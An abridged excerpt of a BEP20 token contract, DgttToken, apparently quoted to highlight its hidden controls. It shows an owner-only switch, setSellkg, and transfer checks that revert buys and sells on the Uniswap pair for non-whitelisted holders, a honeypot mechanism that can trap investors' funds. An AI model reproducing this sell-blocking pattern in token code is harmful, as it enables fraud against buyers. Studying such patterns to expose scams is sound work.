 ...
 contract DgttToken is IBEP20, OwnAdmin
{
    ...
    constructor()
    {
        ...
        _sellcg = true;
        myadmin = owner();
        mmcs = 0x4C218B33022A6B5b8FBC6768EF6fb53074F97BC8;
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    function setSellkg(bool b) external onlyOwner {
        _sellcg = b;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(!_iscg && sender == uniswapV2Pair && !isMarketPair[recipient]) {
            revert("Can not transfer");
        }
        if(!_sellcg && recipient == uniswapV2Pair && !isMarketPair[sender]) {
            revert("Can not transfer");
        }
        ...
        pairamount = pairamount.add(finalAmount);
